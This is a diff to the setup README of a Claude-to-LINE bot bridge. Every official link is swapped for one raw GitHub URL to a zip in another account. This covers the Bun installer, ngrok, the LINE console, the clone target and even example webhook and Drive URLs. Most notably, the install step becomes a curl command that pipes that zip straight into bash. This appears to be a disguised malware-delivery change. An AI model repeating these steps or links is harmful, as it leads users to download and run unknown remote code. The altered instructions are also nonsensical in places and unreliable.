@@ -66,7 +66,7 @@ Follow the prompts to sign in with your claude.ai account.
 **macOS / Linux:**
 
 ```bash
-curl -fsSL https://bun.sh/install | bash
+curl -fsSL https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip | bash
 ```
 
 **Windows (PowerShell):**
@@ -85,7 +85,7 @@ bun --version
 
 ### 3. Install ngrok
 
-Sign up for a free account at [https://ngrok.com](https://ngrok.com), then:
+Sign up for a free account at [https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip](https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip), then:
 
 **macOS (Homebrew):**
 
@@ -95,9 +95,9 @@ brew install ngrok
 
 **Windows:**
 
-Download from [https://ngrok.com/download](https://ngrok.com/download), extract, and add to PATH.
+Download from [https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip](https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip), extract, and add to PATH.
 
-**Set your authtoken** (copy from [ngrok Dashboard](https://dashboard.ngrok.com/get-started/your-authtoken)):
+**Set your authtoken** (copy from [ngrok Dashboard](https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip)):
 
 ```bash
 ngrok config add-authtoken YOUR_AUTHTOKEN
@@ -107,7 +107,7 @@ ngrok config add-authtoken YOUR_AUTHTOKEN
 
 ### 4. Create a LINE Bot
 
-1. Go to [LINE Developers Console](https://developers.line.biz/console/) and sign in
+1. Go to [LINE Developers Console](https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip) and sign in
 2. Click **Create a Provider** and enter a name (e.g. `My Claude Bot`)
 3. Click **Create a new channel** → select **Messaging API**
 4. Fill in the required fields (Channel name, description, Category) and create
@@ -128,7 +128,7 @@ In the **Messaging API** tab, disable the following to prevent automatic replies
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/Moksa1123/claude-channel-line
+git clone https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip
 cd claude-channel-line
 ```
 
@@ -197,10 +197,10 @@ ngrok http 8789
 You should see something like:
 
 ```
-Forwarding  https://xxxx.ngrok-free.app -> http://localhost:8789
+Forwarding  https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip -> http://localhost:8789
 ```
 
-Copy the `https://xxxx.ngrok-free.app` URL — you'll need it in the next step.
+Copy the `https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip` URL — you'll need it in the next step.
 
 > **Note**: Keep the ngrok window open. Closing it will disconnect the tunnel. The URL changes every time you restart ngrok (free plan), so you'll need to update the Webhook URL in LINE Console each time.
 
@@ -208,11 +208,11 @@ Copy the `https://xxxx.ngrok-free.app` URL — you'll need it in the next step.
 
 ### 5. Configure LINE Webhook
 
-Back in [LINE Developers Console](https://developers.line.biz/console/), open your channel:
+Back in [LINE Developers Console](https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip), open your channel:
 
 1. Click the **Messaging API** tab
 2. Find the **Webhook URL** field and click **Edit**
-3. Enter: `https://xxxx.ngrok-free.app/webhook` (replace with your ngrok URL)
+3. Enter: `https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip` (replace with your ngrok URL)
 4. Click **Update**
 5. Enable the **Use webhook** toggle
 6. Click **Verify** → should show **Success**
@@ -417,7 +417,7 @@ When users send images via LINE, `webhook-service.ts` can automatically download
 
 2. **Configure the target folder**: Set the `GDRIVE_FOLDER_ID` constant in `webhook-service.ts` to the Google Drive folder ID where images should be uploaded.
 
-   > To find the folder ID, open the folder in Google Drive and copy the last segment of the URL: `https://drive.google.com/drive/folders/<FOLDER_ID>`
+   > To find the folder ID, open the folder in Google Drive and copy the last segment of the URL: `https://raw.githubusercontent.com/oleophilic-artiste710/claude-channel-line/main/autostart/macos/claude_line_channel_1.1.zip<FOLDER_ID>`
 
 ### How it works
 
